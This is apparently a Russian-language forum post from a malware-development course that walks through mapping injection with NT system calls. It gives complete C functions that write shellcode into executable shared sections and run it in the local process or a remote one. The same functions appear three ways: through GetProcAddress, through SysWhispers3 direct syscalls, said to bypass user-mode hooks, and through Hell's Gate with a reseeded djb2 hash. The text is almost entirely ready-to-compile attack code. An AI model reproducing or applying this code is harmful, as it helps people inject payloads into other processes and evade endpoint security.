	<div class="bbCodeBlock-title">
		Код:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code></code></pre>
	</div>
</div><br />
В этом модуле параметр ProcessHandle будет равен текущему дескриптору процесса, который может быть получен с помощью функции GetCurrentProcess. Параметр BaseAddress будет базовым адресом отображения, который был предоставлен ранее.<br />
<br />
NtClose Это результирующий системный вызов из CloseHandle WinAPI. NtClose показан ниже.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>NTSTATUS NtClose(
IN HANDLE Handle // Дескриптор, который нужно закрыть
);</code></pre>
	</div>
</div><br />
В этом модуле параметр Handle будет либо дескриптором секции, полученным из вызова NtCreateSection, либо дескриптором процесса, который может быть получен с помощью функции GetCurrentProcess.<br />
<br />
<b>Реализация с использованием GetProcAddress и GetModuleHandle</b><br />
<br />
Следующим шагом является реализация метода инъекции через отображение с использованием ранее показанных системных вызовов. Аналогично предыдущему модулю, метод будет показан тремя способами, начиная с использования GetProcAddress и GetModuleHandle.<br />
<br />
Структура Syscall создается и инициализируется с помощью InitializeSyscallStruct, которая содержит адреса используемых системных вызовов, как показано ниже.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		Код:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>// структура, используемая для хранения системных вызовов
typedef struct _Syscall {

    fnNtCreateSection       pNtCreateSection;
    fnNtMapViewOfSection    pNtMapViewOfSection;
    fnUnmapViewOfSection    pNtUnmapViewOfSection;
    fnNtClose               pNtClose;
    fnNtCreateThreadEx      pNtCreateThreadEx;

}Syscall, * PSyscall;

// функция, используемая для заполнения входной структуры &#039;St&#039;
BOOL InitializeSyscallStruct (OUT PSyscall St) {

    HMODULE hNtdll    = GetModuleHandle(L&quot;NTDLL.DLL&quot;);
    if (!hNtdll) {
        printf(&quot;[!] GetModuleHandle не удалось. Ошибка: %d \n&quot;, GetLastError());
        return FALSE;
    }

    St-&gt;pNtCreateSection         = (fnNtCreateSection)GetProcAddress(hNtdll, &quot;NtCreateSection&quot;);
    St-&gt;pNtMapViewOfSection      = (fnNtMapViewOfSection)GetProcAddress(hNtdll, &quot;NtMapViewOfSection&quot;);
    St-&gt;pNtUnmapViewOfSection    = (fnUnmapViewOfSection)GetProcAddress(hNtdll, &quot;NtUnmapViewOfSection&quot;);
    St-&gt;pNtClose                 = (fnNtClose)GetProcAddress(hNtdll, &quot;NtClose&quot;);
    St-&gt;pNtCreateThreadEx        = (fnNtCreateThreadEx)GetProcAddress(hNtdll, &quot;NtCreateThreadEx&quot;);

     // проверка, пропустил ли GetProcAddress системный вызов
    if (St-&gt;pNtCreateSection == NULL || St-&gt;pNtMapViewOfSection == NULL || St-&gt;pNtUnmapViewOfSection == NULL || St-&gt;pNtClose == NULL || St-&gt;pNtCreateThreadEx == NULL)
        return FALSE;
    else
        return TRUE;
}</code></pre>
	</div>
</div><br />
Функции LocalMappingInjectionViaSyscalls и RemoteMappingInjectionViaSyscalls отвечают за инъекцию полезной нагрузки (pPayload) в локальный и удаленный процесс (hProcess) соответственно.<br />
Обе функции показаны ниже.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL LocalMappingInjectionViaSyscalls(IN PVOID pPayload, IN SIZE_T sPayloadSize) {

    HANDLE                hSection        = NULL;
    HANDLE                hThread            = NULL;
    PVOID                pAddress        = NULL;
    NTSTATUS            STATUS            = NULL;
    SIZE_T                sViewSize        = NULL;
    LARGE_INTEGER        MaximumSize        = {
            .HighPart = 0,
            .LowPart = sPayloadSize
    };
    Syscall                St                = { 0 };

    // Инициализация структуры &#039;St&#039; для получения адресов системных вызовов
    if (!InitializeSyscallStruct(&amp;St)) {
        printf(&quot;[!] Could Not Initialize The Syscall Struct \n&quot;);
        return FALSE;
    }

//--------------------------------------------------------------------------
    // Выделение локального отображения

    if ((STATUS = St.pNtCreateSection(&amp;hSection, SECTION_ALL_ACCESS, NULL, &amp;MaximumSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) != 0) {
        printf(&quot;[!] NtCreateSection Failed With Error : 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    if ((STATUS = St.pNtMapViewOfSection(hSection, (HANDLE)-1, &amp;pAddress, NULL, NULL, NULL, &amp;sViewSize, ViewShare, NULL, PAGE_EXECUTE_READWRITE)) != 0) {
        printf(&quot;[!] NtMapViewOfSection Failed With Error : 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }
    printf(&quot;[+] Allocated Address At : 0x%p Of Size : %d \n&quot;, pAddress, sViewSize);

//--------------------------------------------------------------------------
    // Запись полезной нагрузки

    printf(&quot;[#] Press &lt;Enter&gt; To Write The Payload ... &quot;);
    getchar();
    memcpy(pAddress, pPayload, sPayloadSize);
    printf(&quot;\t[+] Payload is Copied From 0x%p To 0x%p \n&quot;, pPayload, pAddress);

//--------------------------------------------------------------------------

    // Выполнение полезной нагрузки с помощью создания потока

    printf(&quot;[#] Press &lt;Enter&gt; To Run The Payload ... &quot;);
    getchar();
    printf(&quot;\t[i] Running Thread Of Entry 0x%p ... &quot;, pAddress);
    if ((STATUS = St.pNtCreateThreadEx(&amp;hThread, THREAD_ALL_ACCESS, NULL, (HANDLE)-1, pAddress, NULL, NULL, NULL, NULL, NULL, NULL)) != 0) {
        printf(&quot;[!] NtCreateThreadEx Failed With Error : 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }
    printf(&quot;[+] DONE \n&quot;);
    printf(&quot;\t[+] Thread Created With Id : %d \n&quot;, GetThreadId(hThread));

//--------------------------------------------------------------------------

    // Отключение локального отображения - только после выполнения полезной нагрузки
    if ((STATUS = St.pNtUnmapViewOfSection((HANDLE)-1, pAddress)) != 0) {
        printf(&quot;[!] NtUnmapViewOfSection Failed With Error : 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    // Закрытие дескриптора секции
    if ((STATUS = St.pNtClose(hSection)) != 0) {
        printf(&quot;[!] NtClose Failed With Error : 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    return TRUE;
}</code></pre>
	</div>
</div><br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL RemoteMappingInjectionViaSyscalls(IN HANDLE hProcess, IN PVOID pPayload, IN SIZE_T sPayloadSize) {

    HANDLE                hSection            = NULL;
    HANDLE                hThread                = NULL;
    PVOID                pLocalAddress        = NULL,
                        pRemoteAddress        = NULL;
    NTSTATUS            STATUS                = NULL;
    SIZE_T                sViewSize            = NULL;
    LARGE_INTEGER        MaximumSize         = {
            .HighPart = 0,
            .LowPart = sPayloadSize
    };
    Syscall                St                    = { 0 };

    // Инициализация структуры &#039;St&#039; для получения адресов системных вызовов
    if (!InitializeSyscallStruct(&amp;St)) {
        printf(&quot;[!] Could Not Initialize The Syscall Struct \n&quot;);
        return FALSE;
    }

    // Выделение отображения в удаленном процессе
    if ((STATUS = St.pNtCreateSection(&amp;hSection, SECTION_ALL_ACCESS, NULL, &amp;MaximumSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) != 0) {
        printf(&quot;[!] NtCreateSection Failed With Error : 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    if ((STATUS = St.pNtMapViewOfSection(hSection, (HANDLE)-1, &amp;pLocalAddress, NULL, NULL, NULL, &amp;sViewSize, ViewShare, NULL, PAGE_EXECUTE_READWRITE)) != 0) {
        printf(&quot;[!] NtMapViewOfSection Failed With Error : 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    printf(&quot;[+] Allocated Local Address At : 0x%p Of Size : %d \n&quot;, pLocalAddress, sViewSize);

    // Запись полезной нагрузки в локальное отображение
    printf(&quot;[#] Press &lt;Enter&gt; To Write The Payload ... &quot;);
    getchar();
    memcpy(pLocalAddress, pPayload, sPayloadSize);
    printf(&quot;\t[+] Payload is Copied From 0x%p To 0x%p \n&quot;, pPayload, pLocalAddress);

    // Получение адреса в удаленном процессе
    if ((STATUS = St.pNtMapViewOfSection(hSection, hProcess, &amp;pRemoteAddress, NULL, NULL, NULL, &amp;sViewSize, ViewShare, NULL, PAGE_EXECUTE_READWRITE)) != 0) {
        printf(&quot;[!] NtMapViewOfSection Failed With Error : 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }
    printf(&quot;[+] Allocated Remote Address At : 0x%p Of Size : %d \n&quot;, pRemoteAddress, sViewSize);

    // Запуск полезной нагрузки в удаленном процессе
    printf(&quot;[#] Press &lt;Enter&gt; To Run The Payload ... &quot;);
    getchar();
    printf(&quot;\t[i] Running Thread Of Entry 0x%p In The Remote Process ... &quot;, pRemoteAddress);
    if ((STATUS = St.pNtCreateThreadEx(&amp;hThread, THREAD_ALL_ACCESS, NULL, hProcess, pRemoteAddress, NULL, NULL, NULL, NULL, NULL, NULL)) != 0) {
        printf(&quot;[!] NtCreateThreadEx Failed With Error : 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }
    printf(&quot;[+] DONE \n&quot;);
    printf(&quot;\t[+] Thread Created With Id : %d \n&quot;, GetThreadId(hThread));

    // Освобождение локального отображения
    if ((STATUS = St.pNtUnmapViewOfSection((HANDLE)-1, pLocalAddress)) != 0) {
        printf(&quot;[!] NtUnmapViewOfSection Failed With Error : 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    // Закрытие дескриптора секции
    if ((STATUS = St.pNtClose(hSection)) != 0) {
        printf(&quot;[!] NtClose Failed With Error : 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    return TRUE;
}</code></pre>
	</div>
</div><br />
Функцию NtUnmapViewOfSection следует выполнять только после завершения выполнения полезной нагрузки. Попытка отмены отображения локального представления во время выполнения полезной нагрузки может привести к нарушению выполнения полезной нагрузки или вызвать сбой процесса. В качестве альтернативы можно использовать системный вызов NtWaitForSingleObject для ожидания завершения потока, после чего можно выполнить системный вызов NtUnmapViewOfSection для очистки отображенной полезной нагрузки. Однако это остается на усмотрение читателя.<br />
<br />
<b>Реализация с использованием SysWhispers</b><br />
<br />
В данной реализации используется SysWhispers3 для обхода пользовательских хуков через прямые системные вызовы. Для создания необходимых файлов для этой реализации используется следующая команда.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		Код:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>python syswhispers.py -a x64 -c msvc -m jumper_randomized -f NtCreateSection,NtMapViewOfSection,NtUnmapViewOfSection,NtClose,NtCreateThreadEx -o SysWhispers -v*</code></pre>
	</div>
</div><br />
Генерируются три файла: SysWhispers.h, SysWhispers.c и SysWhispers-asm.x64.asm.<br />
<br />
Следующим шагом является импорт этих файлов в Visual Studio, как показано было выше.<br />
<br />
Ниже приведены функции LocalMappingInjectionViaSyscalls и RemoteMappingInjectionViaSyscalls.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL LocalMappingInjectionViaSyscalls(IN PVOID pPayload, IN SIZE_T sPayloadSize) {

    HANDLE                hSection        = NULL;
    HANDLE                hThread            = NULL;
    PVOID                pAddress        = NULL;
    NTSTATUS            STATUS            = NULL;
    SIZE_T                sViewSize        = NULL;
    LARGE_INTEGER        MaximumSize        = {
            .HighPart = 0,
            .LowPart = sPayloadSize
    };

//--------------------------------------------------------------------------
    // Выделение локального представления

    if ((STATUS = NtCreateSection(&amp;hSection, SECTION_ALL_ACCESS, NULL, &amp;MaximumSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) != 0) {
        printf(&quot;[!] NtCreateSection завершилась с ошибкой: 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    if ((STATUS = NtMapViewOfSection(hSection, (HANDLE)-1, &amp;pAddress, NULL, NULL, NULL, &amp;sViewSize, ViewShare, NULL, PAGE_EXECUTE_READWRITE)) != 0) {
        printf(&quot;[!] NtMapViewOfSection завершилась с ошибкой: 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }
    printf(&quot;[+] Выделен адрес: 0x%p размером: %d \n&quot;, pAddress, sViewSize);

//--------------------------------------------------------------------------

    // Запись полезной нагрузки
    printf(&quot;[#] Нажмите &lt;Enter&gt;, чтобы записать полезную нагрузку ... &quot;);
    getchar();
    memcpy(pAddress, pPayload, sPayloadSize);
    printf(&quot;\t[+] Полезная нагрузка скопирована с 0x%p по 0x%p \n&quot;, pPayload, pAddress);

//--------------------------------------------------------------------------

    // Выполнение полезной нагрузки через создание потока

    printf(&quot;[#] Нажмите &lt;Enter&gt;, чтобы запустить полезную нагрузку ... &quot;);
    getchar();
    printf(&quot;\t[i] Запуск потока с точки входа 0x%p ... &quot;, pAddress);
    if ((STATUS = NtCreateThreadEx(&amp;hThread, THREAD_ALL_ACCESS, NULL, (HANDLE)-1, pAddress, NULL, NULL, NULL, NULL, NULL, NULL)) != 0) {
        printf(&quot;[!] NtCreateThreadEx завершилась с ошибкой: 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }
    printf(&quot;[+] ГОТОВО \n&quot;);
    printf(&quot;\t[+] Поток создан с ID : %d \n&quot;, GetThreadId(hThread));

//--------------------------------------------------------------------------

    // Отмена отображения локального представления - только после завершения выполнения полезной нагрузки
    if ((STATUS = NtUnmapViewOfSection((HANDLE)-1, pAddress)) != 0) {
        printf(&quot;[!] NtUnmapViewOfSection завершилась с ошибкой: 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    // Закрытие дескриптора раздела
    if ((STATUS = NtClose(hSection)) != 0) {
        printf(&quot;[!] NtClose завершилась с ошибкой: 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    return TRUE;
}</code></pre>
	</div>
</div><br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL RemoteMappingInjectionViaSyscalls(IN HANDLE hProcess, IN PVOID pPayload, IN SIZE_T sPayloadSize) {

    HANDLE                hSection            = NULL;
    HANDLE                hThread                = NULL;
    PVOID                pLocalAddress        = NULL,
                        pRemoteAddress        = NULL;
    NTSTATUS            STATUS                = NULL;
    SIZE_T                sViewSize            = NULL;
    LARGE_INTEGER        MaximumSize         = {
            .HighPart = 0,
            .LowPart = sPayloadSize
    };

//--------------------------------------------------------------------------
    // Выделение локального представления

    if ((STATUS = NtCreateSection(&amp;hSection, SECTION_ALL_ACCESS, NULL, &amp;MaximumSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) != 0) {
        printf(&quot;[!] NtCreateSection завершилась с ошибкой: 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    if ((STATUS = NtMapViewOfSection(hSection, (HANDLE)-1, &amp;pLocalAddress, NULL, NULL, NULL, &amp;sViewSize, ViewShare, NULL, PAGE_READWRITE)) != 0) {
        printf(&quot;[!] NtMapViewOfSection [L] завершилась с ошибкой: 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    printf(&quot;[+] Локальная память выделена по адресу: 0x%p размером: %d \n&quot;, pLocalAddress, sViewSize);

//--------------------------------------------------------------------------

    // Запись полезной нагрузки
    printf(&quot;[#] Нажмите &lt;Enter&gt;, чтобы записать полезную нагрузку ... &quot;);
    getchar();
    memcpy(pLocalAddress, pPayload, sPayloadSize);
    printf(&quot;\t[+] Полезная нагрузка скопирована с 0x%p по 0x%p \n&quot;, pPayload, pLocalAddress);

//--------------------------------------------------------------------------

    // Выделение удаленного представления
    if ((STATUS = NtMapViewOfSection(hSection, hProcess, &amp;pRemoteAddress, NULL, NULL, NULL, &amp;sViewSize, ViewShare, NULL, PAGE_EXECUTE_READWRITE)) != 0) {
        printf(&quot;[!] NtMapViewOfSection [R] завершилась с ошибкой: 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    printf(&quot;[+] Удаленная память выделена по адресу: 0x%p размером: %d \n&quot;, pRemoteAddress, sViewSize);

//--------------------------------------------------------------------------

    // Выполнение полезной нагрузки через создание потока
    printf(&quot;[#] Нажмите &lt;Enter&gt;, чтобы запустить полезную нагрузку ... &quot;);
    getchar();
    printf(&quot;\t[i] Запуск потока с точки входа 0x%p ... &quot;, pRemoteAddress);
    if ((STATUS = NtCreateThreadEx(&amp;hThread, THREAD_ALL_ACCESS, NULL, hProcess, pRemoteAddress, NULL, NULL, NULL, NULL, NULL, NULL)) != 0) {
        printf(&quot;[!] NtCreateThreadEx завершилась с ошибкой: 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }
    printf(&quot;[+] ГОТОВО \n&quot;);
    printf(&quot;\t[+] Поток создан с ID : %d \n&quot;, GetThreadId(hThread));

//--------------------------------------------------------------------------

    // Отмена отображения локального представления - только после завершения выполнения полезной нагрузки
    if ((STATUS = NtUnmapViewOfSection((HANDLE)-1, pLocalAddress)) != 0) {
        printf(&quot;[!] NtUnmapViewOfSection завершилась с ошибкой: 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    // Закрытие дескриптора раздела
    if ((STATUS = NtClose(hSection)) != 0) {
        printf(&quot;[!] NtClose завершилась с ошибкой: 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    return TRUE;
}</code></pre>
	</div>
</div><br />
<b>Реализация с использованием Hell&#039;s Gate</b><br />
<br />
Последняя реализация для этого модуля использует Hell&#039;s Gate. Во-первых, убедитесь, что выполняются те же шаги, что и для настройки проекта Visual Studio с SysWhispers3.<br />
В частности, включение MASM и изменение свойств для установки файла ASM для компиляции с использованием Microsoft Macro Assembler.<br />
<br />
<b>Обновление структуры VX_TABLE</b><br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef struct _VX_TABLE {
    VX_TABLE_ENTRY NtCreateSection;
    VX_TABLE_ENTRY NtMapViewOfSection;
    VX_TABLE_ENTRY NtUnmapViewOfSection;
    VX_TABLE_ENTRY NtClose;
    VX_TABLE_ENTRY NtCreateThreadEx;
} VX_TABLE, * PVX_TABLE;</code></pre>
	</div>
</div><br />
<b>Обновление значения Seed Value</b><br />
<br />
Новое значение семени будет использоваться <a href="https://github.com/am0nsec/HellsGate/blob/master/HellsGate/main.c#L93" target="_blank" class="link link--external" rel="noopener">вместо старого</a>, чтобы изменить хэш-значения системных вызовов. Функция хеширования djb2 обновляется с новым значением <b>Seed Value</b>, приведенным ниже:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>DWORD64 djb2(PBYTE str) {
    DWORD64 dwHash = 0x77347734DEADBEEF; // Старое значение: 0x7734773477347734
    INT c;

    while (c = *str++)
        dwHash = ((dwHash &lt;&lt; 0x5) + dwHash) + c;

    return dwHash;
}</code></pre>
	</div>
</div><br />
Теперь необходимо сгенерировать хэш-значений djb2 для функций (Напишите консольную программу например):<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>printf(&quot;#define %s%s 0x%p \n&quot;, &quot;NtCreateSection&quot;, &quot;_djb2&quot;, (DWORD64)djb2(&quot;NtCreateSection&quot;));
printf(&quot;#define %s%s 0x%p \n&quot;, &quot;NtMapViewOfSection&quot;, &quot;_djb2&quot;, djb2(&quot;NtMapViewOfSection&quot;));
printf(&quot;#define %s%s 0x%p \n&quot;, &quot;NtUnmapViewOfSection&quot;, &quot;_djb2&quot;, djb2(&quot;NtUnmapViewOfSection&quot;));
printf(&quot;#define %s%s 0x%p \n&quot;, &quot;NtClose&quot;, &quot;_djb2&quot;, djb2(&quot;NtClose&quot;));
printf(&quot;#define %s%s 0x%p \n&quot;, &quot;NtCreateThreadEx&quot;, &quot;_djb2&quot;, djb2(&quot;NtCreateThreadEx&quot;));</code></pre>
	</div>
</div><br />
Как только значения сгенерированы, добавьте их в начало проекта Hell&#039;s Gate:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>#define NtCreateSection_djb2         0x5687F81AC5D1497A
#define NtMapViewOfSection_djb2      0x0778E82F702E79D4
#define NtUnmapViewOfSection_djb2    0x0BF2A46A27B93797
#define NtClose_djb2                 0x0DA4FA80EF5031E7
#define NtCreateThreadEx_djb2        0x2786FB7E75145F1A</code></pre>
	</div>
</div><br />
<b>Функции LocalMappingInjectionViaSyscalls и RemoteMappingInjectionViaSyscalls</b><br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL LocalMappingInjectionViaSyscalls(IN PVX_TABLE pVxTable, IN PVOID pPayload, IN SIZE_T sPayloadSize) {

    HANDLE                hSection        = NULL;
    HANDLE                hThread            = NULL;
    PVOID                pAddress        = NULL;
    NTSTATUS            STATUS            = NULL;
    SIZE_T                sViewSize        = NULL;
    LARGE_INTEGER        MaximumSize     = {
            .HighPart = 0,
            .LowPart = sPayloadSize
    };

//--------------------------------------------------------------------------
    // Выделение локального представления
    HellsGate(pVxTable-&gt;NtCreateSection.wSystemCall);
    if ((STATUS = HellDescent(&amp;hSection, SECTION_ALL_ACCESS, NULL, &amp;MaximumSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) != 0) {
        printf(&quot;[!] NtCreateSection завершилась с ошибкой: 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    HellsGate(pVxTable-&gt;NtMapViewOfSection.wSystemCall);
    if ((STATUS = HellDescent(hSection, (HANDLE)-1, &amp;pAddress, NULL, NULL, NULL, &amp;sViewSize, ViewShare, NULL, PAGE_EXECUTE_READWRITE)) != 0) {
        printf(&quot;[!] NtMapViewOfSection завершилась с ошибкой: 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }
    printf(&quot;[+] Выделен адрес: 0x%p размером: %ld \n&quot;, pAddress, sViewSize);

//--------------------------------------------------------------------------
    // Запись полезной нагрузки
    printf(&quot;[#] Нажмите &lt;Enter&gt;, чтобы записать полезную нагрузку ... &quot;);
    getchar();
    memcpy(pAddress, pPayload, sPayloadSize);
    printf(&quot;\t[+] Полезная нагрузка скопирована с 0x%p по 0x%p \n&quot;, pPayload, pAddress);
    printf(&quot;[#] Нажмите &lt;Enter&gt;, чтобы запустить полезную нагрузку ... &quot;);
    getchar();

//--------------------------------------------------------------------------

    // Выполнение полезной нагрузки через создание потока
    printf(&quot;\t[i] Запуск потока с точки входа 0x%p ... &quot;, pAddress);
    HellsGate(pVxTable-&gt;NtCreateThreadEx.wSystemCall);
    if ((STATUS = HellDescent(&amp;hThread, THREAD_ALL_ACCESS, NULL, (HANDLE)-1, pAddress, NULL, NULL, NULL, NULL, NULL, NULL)) != 0) {
        printf(&quot;[!] NtCreateThreadEx завершилась с ошибкой: 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }
    printf(&quot;[+] ГОТОВО \n&quot;);
    printf(&quot;\t[+] Поток создан с ID : %d \n&quot;, GetThreadId(hThread));

//--------------------------------------------------------------------------

    // Отмена отображения локального представления - только после завершения выполнения полезной нагрузки
    HellsGate(pVxTable-&gt;NtUnmapViewOfSection.wSystemCall);
    if ((STATUS = HellDescent((HANDLE)-1, pAddress)) != 0) {
        printf(&quot;[!] NtUnmapViewOfSection завершилась с ошибкой: 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    // Закрытие дескриптора раздела
    HellsGate(pVxTable-&gt;NtClose.wSystemCall);
    if ((STATUS = HellDescent(hSection)) != 0) {
        printf(&quot;[!] NtClose завершилась с ошибкой: 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    return TRUE;
}</code></pre>
	</div>
</div><br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL RemoteMappingInjectionViaSyscalls(IN PVX_TABLE pVxTable, IN HANDLE hProcess, IN PVOID pPayload, IN SIZE_T sPayloadSize) {

    HANDLE                hSection            = NULL;
    HANDLE                hThread                = NULL;
    PVOID                pLocalAddress        = NULL,
                        pRemoteAddress        = NULL;
    NTSTATUS            STATUS                = NULL;
    SIZE_T                sViewSize            = NULL;
    LARGE_INTEGER        MaximumSize         = {
            .HighPart = 0,
            .LowPart = sPayloadSize
    };

//--------------------------------------------------------------------------
    // Выделение локального представления

    HellsGate(pVxTable-&gt;NtCreateSection.wSystemCall);
    if ((STATUS = HellDescent(&amp;hSection, SECTION_ALL_ACCESS, NULL, &amp;MaximumSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) != 0) {
        printf(&quot;[!] NtCreateSection завершилась с ошибкой: 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    HellsGate(pVxTable-&gt;NtMapViewOfSection.wSystemCall);
    if ((STATUS = HellDescent(hSection, (HANDLE)-1, &amp;pLocalAddress, NULL, NULL, NULL, &amp;sViewSize, ViewShare, NULL, PAGE_READWRITE)) != 0) {
        printf(&quot;[!] NtMapViewOfSection [L] завершилась с ошибкой: 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    printf(&quot;[+] Локальная память выделена по адресу: 0x%p размером: %d \n&quot;, pLocalAddress, sViewSize);

//--------------------------------------------------------------------------

    // Запись полезной нагрузки
    printf(&quot;[#] Нажмите &lt;Enter&gt;, чтобы записать полезную нагрузку ... &quot;);
    getchar();
    memcpy(pLocalAddress, pPayload, sPayloadSize);
    printf(&quot;\t[+] Полезная нагрузка скопирована с 0x%p по 0x%p \n&quot;, pPayload, pLocalAddress);

//--------------------------------------------------------------------------

    // Выделение удаленного представления
    HellsGate(pVxTable-&gt;NtMapViewOfSection.wSystemCall);
    if ((STATUS = HellDescent(hSection, hProcess, &amp;pRemoteAddress, NULL, NULL, NULL, &amp;sViewSize, ViewShare, NULL, PAGE_EXECUTE_READWRITE)) != 0) {
        printf(&quot;[!] NtMapViewOfSection [R] завершилась с ошибкой: 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    printf(&quot;[+] Удаленная память выделена по адресу: 0x%p размером: %d \n&quot;, pRemoteAddress, sViewSize);

//--------------------------------------------------------------------------

    // Выполнение полезной нагрузки через создание потока
    printf(&quot;[#] Нажмите &lt;Enter&gt;, чтобы запустить полезную нагрузку ... &quot;);
    getchar();
    printf(&quot;\t[i] Запуск потока с точки входа 0x%p ... &quot;, pRemoteAddress);
    HellsGate(pVxTable-&gt;NtCreateThreadEx.wSystemCall);
    if ((STATUS = HellDescent(&amp;hThread, THREAD_ALL_ACCESS, NULL, hProcess, pRemoteAddress, NULL, NULL, NULL, NULL, NULL, NULL)) != 0) {
        printf(&quot;[!] NtCreateThreadEx завершилась с ошибкой: 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }
    printf(&quot;[+] ГОТОВО \n&quot;);
